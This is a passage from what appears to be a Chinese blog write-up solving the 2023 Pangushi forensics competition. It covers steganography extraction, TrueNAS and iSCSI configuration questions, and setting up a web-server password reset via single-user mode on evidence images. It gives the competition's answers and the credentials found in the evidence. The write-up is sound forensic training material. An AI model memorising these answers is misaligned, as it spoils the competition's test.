src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106145725235.png" alt="image-20251106145725235"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oursecret</span><br></pre></td></tr></table></figure><h2 id="question15">question15√</h2><p>接上题，请给出使用该隐写工具隐写文件所使用的密码？[答案格式:xx]</p><p>由于隐写工具其实只有记录在该电脑上，所以密码的话也是纯找，首先我们要将查看隐藏文件开起来</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106150231455.png" alt="image-20251106150231455"></p><p>然后到<code>onedirve</code>这边有一个<code>新建文档.txt</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106150302624.png" alt="image-20251106150302624"></p><p>里面就有一个密码，该密码就是隐写密码</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106150318040.png" alt="image-20251106150318040"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">caiwu</span><br></pre></td></tr></table></figure><h2 id="question16">question16√</h2><p>据技术人员交代，其电脑内存过一个名为“财务流水.rar”的文件，请给出该文件的SHA-1?[答案格式:字母小写]</p><p>这题要起NAS，暂时先鸽一下。</p><p>当NAS服务一起（并且虚拟化有开），技术人员的电脑马上就会出现一个神秘E盘</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108001335601.png" alt="image-20251108001335601"></p><p>在里面会有一个神秘小视频，这个其实是隐写的东西</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108002407965.png" alt="image-20251108002407965"></p><p>还会找到一个隐写的工具</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108002444022.png" alt="image-20251108002444022"></p><p>打开后选择前面那个视频，密码输入<code>caiwu</code>，然后解除隐写</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108002547752.png" alt="image-20251108002547752"></p><p>提取出来一个财务.rar文件这个就是我们要找的文件</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108002651294.png" alt="image-20251108002651294"></p><p>接下来就是计算哈希中值了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108003216790.png" alt="image-20251108003216790"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251108003233424.png" alt="image-20251108003233424"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ac6d658f42915bda02c13f890e47bc08b6736a24</span><br></pre></td></tr></table></figure><h1 id="服务器取证">服务器取证</h1><p>做服务器取证需要用上前面<code>技术人员电脑</code>，然后使用<code>NAS</code>服务器检材起服务。</p><h2 id="前提准备火眼梭">前提准备——火眼梭</h2><p>先将<code>NAS</code>的镜像文件导入到火眼中，先取点东西看看</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106233644935.png" alt="image-20251106233644935"></p><p>发现取不到啥东东</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106233740266.png" alt="image-20251106233740266"></p><h2 id="前提准备nas仿真">前提准备——NAS仿真</h2><p>将镜像全导入到火眼仿真</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106233919961.png" alt="image-20251106233919961"></p><p>操作系统检测会检测失败系统类别，不过NAS一般都是Linux</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106234016902.png" alt="image-20251106234016902"></p><p><strong>注意</strong>：由于我们在技术人员谷歌浏览器中可以看到<code>NAS</code>的<code>ip</code>为<code>192.168.91.129</code>，那我们仿真起来的服务器最好也是这个<code>ip</code>，这样就可以少配置很多东西。所以我们需要设置一下虚拟机的网络</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106234453252.png" alt="image-20251106234453252"></p><p>将仅主机模式的子网设置为<code>192.168.91.0</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106234548388.png" alt="image-20251106234548388"></p><p>然后<code>DHCP</code>设置为，设置完后点击应用再开启<code>NAS</code>服务器</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106234619756.png" alt="image-20251106234619756"></p><p>启动起来<code>NAS</code>后就会发现NAS的<code>ip</code>和原来保持一致，这样就方便很多，接下来就是登录一下</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106234922129.png" alt="image-20251106234922129"></p><p>接下来就登录进去了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235041771.png" alt="image-20251106235041771"></p><p>并且web服务也开启来了，我们在宿主机中访问<code>http://192.168.91.129/</code>就可以进入到<code>web</code>登录界面</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235210215.png" alt="image-20251106235210215"></p><p>用<code>question1</code>取到的账户和密码去登录这个就能进入到页面了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235300559.png" alt="image-20251106235300559"></p><ul><li>然后先修改一下语言，这样应该会更看得懂</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107124233005.png" alt="image-20251107124233005"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107124316316.png" alt="image-20251107124316316"></p><h2 id="question1">question1√</h2><p>请分析服务器，给出NAS服务器系统账号密码？[答案格式:xx@xx]</p><p>直接先看技术人员检材中的谷歌浏览器这边，发现有个保存的账号密码<code>root</code>和<code>P@88w0rd</code>，所以<code>NAS</code>服务器系统账号密码就是这个</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106233220495.png" alt="image-20251106233220495"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@P@88w0rd</span><br></pre></td></tr></table></figure><h2 id="question2">question2√</h2><p>请分析服务器，给出NAS服务器的版本信息？[答案格式:xx-xx-xx]</p><p>搭建好<code>NAS</code>服务器，进入<code>web</code>页面后登录即可看到<code>NAS</code>服务器的版本信息</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235345208.png" alt="image-20251106235345208"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrueNAS-<span class="number">13.0</span>-U4</span><br></pre></td></tr></table></figure><h2 id="question3">question3√</h2><p>请分析服务器，给出NAS服务器内用户SMB的邮箱？[答案格式:xx@xx]</p><p>在web页面这边可以看到除了<code>root</code>用户外，还有一个<code>smb</code>用户</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235434577.png" alt="image-20251106235434577"></p><p>下拉就能看到它的邮箱</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235532013.png" alt="image-20251106235532013"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smb@paofen.com</span><br></pre></td></tr></table></figure><h2 id="question4">question4√</h2><p>请分析服务器，给出NAS服务器系统告警服务使用的邮箱？[答案格式:xx@xx]</p><p>直接定位到<code>System-&gt;Alert Services</code>这边</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235635534.png" alt="image-20251106235635534"></p><p>选择编辑</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235717050.png" alt="image-20251106235717050"></p><p>就能看到警告邮箱了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235732670.png" alt="image-20251106235732670"></p><h2 id="question5">question5√</h2><p>请分析服务器，给出NAS服务器内存储池名？[答案格式:xxx]</p><p>直接定位到<code>Storage-&gt;Pools</code>就可以看到<code>vol</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106235911193.png" alt="image-20251106235911193"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol</span><br></pre></td></tr></table></figure><h2 id="question6">question6√</h2><p>请分析服务器，给出NAS服务器内有几个数据集和几个Zvol?[答案格式:0,0]</p><p>这题一开始也是看得懵懵的，数据集是什么，Zvol又是什么，看了wp才知道就是第五问的那个界面。</p><p>然后点击设置就会看到有<code>Zvol</code>动作，所以应该是有<code>3</code>个Zvol</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107124752720.png" alt="image-20251107124752720"></p><p>同样的会有一个数据集动作</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107124846321.png" alt="image-20251107124846321"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2,3</span><br></pre></td></tr></table></figure><h2 id="question7">question7√</h2><p>请分析服务器，给出该NAS服务器存储监听IP和端口？[答案格式:192.168.1.1:8080]</p><p>这题还是不知道存储监听是什么东西，然后看视频发现是这个位置，共享模块算是存储监听</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107125056795.png" alt="image-20251107125056795"></p><p>然后点到<code>Portals</code>这个位置就发现了监听</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107125134136.png" alt="image-20251107125134136"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0:3260</span><br></pre></td></tr></table></figure><h2 id="question8">question8√</h2><p>请分析服务器，给出NAS服务器内iSCSI目标为web的连接所使用的启动器组ID？[答案格式:xx]</p><p>还是定位到问题7的那个模块中，发现有个目标，并且目标中有个<code>web</code>组</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107125303744.png" alt="image-20251107125303744"></p><p>点击编辑界面</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107125328862.png" alt="image-20251107125328862"></p><p>就会发现启动容器组id</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107125344894.png" alt="image-20251107125344894"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="question9">question9?</h2><p>请分析服务器，给出web服务器连接NAS服务器所使用的iqn？[答案格式:iqn.xxx]</p><p>这个感觉是偏常识题，如果找的话是没找到正确答案的。视频up认为这里是正确的</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107130630785.png" alt="image-20251107130630785"></p><ul><li>但是题目的正确答案是：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iqn<span class="number">.2005</span>-<span class="number">10.</span>org.freenas.ctl:web</span><br></pre></td></tr></table></figure><ul><li>个人认为可能确实正确答案是：<code>iqn.2005-10.org.freenas.ctl:web</code>，因为<code>iqn.1994-05.com.redhat:45a66afe8867</code>更像是<code>NAS</code>服务用来标识<code>web</code>服务的</li><li>而web服务用来连接nas服务的应该是nas的全局配置，然后加上目标<code>web</code>，也就是<code>iqn.2005-10.org.freenas.ctl:web</code></li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107131439848.png" alt="image-20251107131439848"></p><h2 id="question10">question10√</h2><p>请分析服务器，给出web服务器连接NAS服务器所使用的账号和密码？[答案格式:root/123]</p><p>还是定位到问题七那个界面的<code>Authorized Access</code>这个界面</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107130426222.png" alt="image-20251107130426222"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107130452534.png" alt="image-20251107130452534"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107130458516.png" alt="image-20251107130458516"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user/202305140921</span><br></pre></td></tr></table></figure><h2 id="网站重构改web服务器密码">网站重构改web服务器密码</h2><p>接下来就是一些<code>web</code>服务器的取证相关的题目了，但是这题比较坑点的地方就是<code>web</code>服务器没有启动，并且可能还涉及到嵌套虚拟化，也就是<code>NAS</code>这个服务器如果使用<code>VMware</code>仿真的话就需要开启<code>vt虚拟化了</code>。（对于我来说这里真比较恶心，因为我基本上现在转wsl2了，所以虚拟机开不了VT虚拟化，需要把Windows的那个虚拟化给关了才行QAQ），因为之前用qemu的时候有研究过这些东西所以对虚拟化还是比较了解的。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107132105785.png" alt="image-20251107132105785"></p><p>接下来先关机开个虚拟化（不过还有个比较难绷的点就是Windows的那个虚拟化会改变机器码，导致虚拟化后取证软件全部要重新认证））</p><p>启动<code>vt</code>虚拟化，顺便把处理器数量之类的拉高一点要不然嵌套虚拟化会导致虚拟机很卡。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107133329489.png" alt="image-20251107133329489"></p><p>重启之后发现ip没问题</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107133544734.png" alt="image-20251107133544734"></p><ul><li>启用虚拟化后就可以开启<code>web</code>服务的那个虚拟机了</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107133618644.png" alt="image-20251107133618644"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107133645029.png" alt="image-20251107133645029"></p><p>启动后需要按<code>e</code>键，进入单用户模式去改密码</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251107134241927.png" alt="image-20251107134241927"></p><p>把这边都删除</p><p><img 